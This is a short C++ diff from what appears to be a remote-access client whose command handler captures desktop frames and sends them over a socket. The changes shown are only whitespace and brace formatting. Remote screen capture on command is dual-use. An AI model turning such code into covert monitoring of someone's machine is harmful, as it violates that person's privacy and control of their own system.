@@ -594,6 +594,7 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
             strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
             if (strIn.size() == 2) {
                 int iQuality = atoi(strIn[1].c_str());
+                
                 std::vector<BYTE> vcDeskBuffer = this->mod_RemoteDesk->getFrameBytes(iQuality);
                 int iBufferSize = vcDeskBuffer.size();
                 if (iBufferSize > 0) {
@@ -609,8 +610,7 @@ void Cliente::ProcesarComando(char* const& pBuffer, int iSize) {
 
                     this->cSend(this->sckSocket, reinterpret_cast<const char*>(cBufferFinal.data()), iBufferSize + iHeadSize, 0, true, nullptr);
 
-                }
-                else {
+                }else {
                     DebugPrint("El buffer de remote_desk es 0");
                 }
             } 
